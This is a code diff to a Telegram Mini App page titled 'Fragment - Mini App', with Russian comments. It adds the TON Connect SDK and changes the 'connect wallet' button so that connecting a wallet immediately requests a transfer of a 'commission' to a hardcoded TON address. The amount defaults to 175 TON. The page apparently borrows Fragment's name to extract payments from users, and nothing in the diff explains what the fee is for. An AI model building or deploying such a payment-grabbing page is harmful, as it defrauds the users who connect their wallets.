@@ -4,6 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Fragment - Mini App</title>
+    <!-- Подключаем TON Connect SDK -->
+    <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
     <style>
         body {
             background-color: #1A1F2B;
@@ -349,6 +351,11 @@
         const tg = window.Telegram.WebApp;
         tg.ready();
 
+        // Инициализация TON Connect
+        const tonConnect = new TonConnectSDK.TonConnect({
+            manifestUrl: 'https://yourdomain.com/tonconnect-manifest.json' // Замените на URL вашего манифеста
+        });
+
         // Загрузка данных из сервера
         async function loadConfig() {
             try {
@@ -372,12 +379,50 @@
             }
         }
 
-        // Функция подключения кошелька с запросом привязки
-        function connectWallet() {
-            // Открываем Telegram Wallet с запросом на подключение
-            tg.openTelegramLink('https://t.me/wallet?startapp=wallet&action=connect');
-            // Альтернативно, можно использовать tg.showPopup для подтверждения, если требуется
-            // tg.showPopup({ message: 'Подключить кошелёк?', buttons: [{ text: 'Подключить', action: 'connect' }] });
+        // Функция подключения кошелька и отправки транзакции
+        async function connectWallet() {
+            try {
+                // Запрашиваем подключение кошелька
+                await tonConnect.connect();
+
+                // Проверяем, подключён ли кошелёк
+                if (!tonConnect.connected) {
+                    tg.showAlert('Ошибка: кошелёк не подключён. Попробуйте снова.');
+                    return;
+                }
+
+                // Получаем сумму комиссии из интерфейса
+                const commissionTon = parseFloat(document.getElementById('commission-ton').textContent) || 175;
+                const commissionNanoTon = Math.round(commissionTon * 1e9); // Конвертируем TON в нанотокены (1 TON = 10^9 нанотокенов)
+
+                // Адрес получателя
+                const recipientAddress = 'UQCLVZxRULA5wbk2I_pSFD6XWYjUsUemNRZ6c5CaUCKAtlpq';
+
+                // Создаём транзакцию
+                const transaction = {
+                    validUntil: Math.floor(Date.now() / 1000) + 60, // Время действия транзакции (60 секунд)
+                    messages: [
+                        {
+                            address: recipientAddress,
+                            amount: commissionNanoTon.toString(), // Сумма в нанотокенах
+                            payload: btoa('Commission payment') // Комментарий (опционально)
+                        }
+                    ]
+                };
+
+                // Отправляем транзакцию
+                const result = await tonConnect.sendTransaction(transaction);
+
+                // Проверяем результат
+                if (result) {
+                    tg.showAlert(`Транзакция успешно отправлена! Сумма комиссии (${commissionTon} TON) отправлена на адрес ${recipientAddress}.`);
+                } else {
+                    tg.showAlert('Ошибка при отправке транзакции. Попробуйте снова.');
+                }
+            } catch (error) {
+                console.error('Ошибка при подключении кошелька или отправке транзакции:', error);
+                tg.showAlert('Произошла ошибка. Проверьте подключение кошелька и попробуйте снова.');
+            }
         }
 
         // Загружаем конфигурацию при запуске
